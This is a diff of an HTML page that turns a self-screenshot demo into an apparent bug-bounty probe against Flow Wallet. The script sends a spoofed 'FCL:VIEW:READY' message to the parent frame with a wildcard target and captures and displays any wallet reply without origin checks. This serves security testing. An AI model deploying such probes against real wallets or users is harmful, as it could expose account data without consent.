@@ -1,55 +1,35 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto Screenshot Website</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <title>Bug Hunter Test</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f4f4f4; }
-        .content { border: 2px solid #333; padding: 20px; background: white; margin-bottom: 20px; }
-        #screenshot-result { margin-top: 20px; border: 5px solid #007bff; max-width: 80%; }
-        h2 { color: #007bff; }
+        body { font-family: sans-serif; text-align: center; padding: 50px; }
+        #status { color: red; font-weight: bold; }
     </style>
 </head>
 <body>
-
-    <div id="capture-area" class="content">
-        <h1>Selamat Datang di Website Saya</h1>
-        <p>Halaman ini akan otomatis mengambil screenshot dirinya sendiri saat dimuat.</p>
-        <img src="https://via.placeholder.com/150" alt="Placeholder Image">
-    </div>
-
-    <hr>
-    <h3>Hasil Screenshot:</h3>
-    <div id="output"></div>
+    <h2>DApp Security Test</h2>
+    <p>Status: <span id="status">Menunggu respon dari Wallet...</span></p>
 
     <script>
-        // Menjalankan fungsi setelah seluruh halaman (termasuk gambar) selesai dimuat
-        window.onload = function() {
-            const captureElement = document.body; // Bagian yang ingin di-screenshot (seluruh body)
+        // 1. Mendengarkan kiriman data dari Flow Wallet
+        window.addEventListener("message", (event) => {
+            // Jika Anda menerima data di sini, periksa event.origin
+            console.log("Data Tertangkap:", event.data);
+            document.getElementById("status").innerText = "Data Diterima: " + JSON.stringify(event.data);
             
-            html2canvas(captureElement).then(canvas => {
-                // Mengubah canvas menjadi URL gambar (PNG)
-                const image = canvas.toDataURL("image/png");
-                
-                // Menampilkan gambar di elemen 'output'
-                const imgElement = document.createElement('img');
-                imgElement.src = image;
-                imgElement.id = 'screenshot-result';
-                document.getElementById('output').appendChild(imgElement);
+            // Jika alert muncul dengan domain 'flow.com', ini adalah UXSS/Origin Bypass
+            alert("Origin Pengirim: " + event.origin + "\nData: " + JSON.stringify(event.data));
+        });
 
-                console.log("Screenshot berhasil diambil!");
-                
-                // Opsional: Jika ingin otomatis mendownload, hapus komentar di bawah ini:
-                /*
-                let link = document.createElement('a');
-                link.download = 'screenshot-website.png';
-                link.href = image;
-                link.click();
-                */
-            });
-        };
+        // 2. Mencoba memicu wallet untuk mengirimkan info akun
+        // Kita menggunakan '*' agar pesan dikirim ke mana saja (uji celah keamanan)
+        setTimeout(() => {
+            if (window.parent !== window) {
+                window.parent.postMessage({ type: 'FCL:VIEW:READY' }, '*'); 
+                // FCL adalah standar Flow Client Library
+            }
+        }, 2000);
     </script>
 </body>
 </html>
